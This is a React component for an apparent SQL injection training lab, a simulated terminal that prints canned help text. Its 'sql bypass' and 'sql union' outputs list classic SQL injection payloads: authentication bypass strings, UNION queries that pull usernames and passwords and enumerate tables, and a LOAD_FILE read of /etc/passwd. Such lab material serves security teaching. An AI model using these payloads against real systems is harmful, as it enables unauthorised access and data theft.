import React, { useState } from 'react';
import { Terminal as TerminalIcon, Play, Trash } from 'lucide-react';

interface SQLLabTerminalProps {
  state: {
    currentQuery: string;
    queryResult: any;
    lastAttempt: any;
    databaseState: {
      tables: string[];
      currentUser: string;
      privileges: string[];
    };
  };
  setState: (state: any) => void;
}

export function SQLLabTerminal({ state, setState }: SQLLabTerminalProps) {
  const [commands, setCommands] = useState<string[]>([]);
  const [currentCommand, setCurrentCommand] = useState('');

  const executeCommand = (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentCommand.trim()) return;

    const command = currentCommand.trim();
    setCommands([...commands, `$ ${command}`]);

    // Process SQL-related commands
    if (command === 'sqlmap --help') {
      setCommands(prev => [...prev,
        'SQLMap - Automatic SQL injection tool',
        '',
        'Usage: sqlmap [options]',
        '',
        'Options:',
        '  -u URL, --url=URL     Target URL',
        '  --data=DATA           POST data string',
        '  --dbms=DBMS           Force back-end DBMS',
        '  --technique=TECH      SQL injection techniques to use',
        '  --current-user        Retrieve current user',
        '  --current-db          Retrieve current database',
        '  --tables             Enumerate DBMS database tables',
        '  --columns            Enumerate DBMS database columns',
        '  --dump               Dump DBMS database table entries',
        '',
        'Example: sqlmap -u "http://target/login.php" --data="user=test&pass=test"'
      ]);
    } else if (command === 'help') {
      setCommands(prev => [...prev,
        'Available commands:',
        '  sqlmap --help        Show SQLMap help',
        '  sql analyze         Analyze current query',
        '  sql bypass         Show auth bypass techniques',
        '  sql union          Show UNION attack examples',
        '  clear             Clear terminal',
        '  help              Show this help message'
      ]);
    } else if (command === 'sql bypass') {
      setCommands(prev => [...prev,
        'SQL Authentication Bypass Techniques:',
        '',
        "1. OR-based bypass:",
        "   admin' OR '1'='1",
        "   ' OR 1=1--",
        "   ' OR 'x'='x",
        '',
        "2. Comment-based bypass:",
        "   admin'--",
        "   admin'#",
        '',
        "3. UNION-based bypass:",
        "   ' UNION SELECT 'admin', 'pass",
        '',
        "4. Boolean-based bypass:",
        "   admin' AND 1=1--",
        "   admin' AND '1'='1"
      ]);
    } else if (command === 'sql union') {
      setCommands(prev => [...prev,
        'UNION-based SQL Injection Examples:',
        '',
        '1. Column number enumeration:',
        "   ' UNION SELECT NULL--",
        "   ' UNION SELECT NULL,NULL--",
        "   ' UNION SELECT NULL,NULL,NULL--",
        '',
        '2. Data extraction:',
        "   ' UNION SELECT username,password FROM users--",
        "   ' UNION SELECT table_name,NULL FROM information_schema.tables--",
        '',
        '3. System information:',
        "   ' UNION SELECT @@version,NULL--",
        "   ' UNION SELECT user(),NULL--",
        '',
        '4. File operations:',
        "   ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--"
      ]);
    } else if (command === 'clear') {
      setCommands([]);
    } else {
      setCommands(prev => [...prev, 'Command not found. Type "help" for available commands']);
    }

    setCurrentCommand('');
  };

  return (
    <div className="bg-gray-950 rounded-lg p-4 font-mono text-sm">
      <div className="flex items-center justify-between mb-4">
        <div className="flex items-center gap-2">
          <TerminalIcon className="w-4 h-4 text-green-400" />
          <span className="text-green-400">SQL Testing Terminal</span>
        </div>
        <button
          onClick={() => setCommands([])}
          className="text-gray-500 hover:text-gray-400"
        >
          <Trash className="w-4 h-4" />
        </button>
      </div>

      <div className="h-80 overflow-y-auto mb-4 space-y-1">
        {commands.map((cmd, i) => (
          <div key={i} className="text-gray-300 whitespace-pre-wrap">{cmd}</div>
        ))}
      </div>

      <form onSubmit={executeCommand} className="flex gap-2">
        <span className="text-green-400">$</span>
        <input
          type="text"
          value={currentCommand}
          onChange={(e) => setCurrentCommand(e.target.value)}
          className="flex-1 bg-transparent focus:outline-none text-gray-300"
          placeholder="Type 'help' for available commands..."
        />
        <button type="submit" className="text-green-400">
          <Play className="w-4 h-4" />
        </button>
      </form>
    </div>
  );
}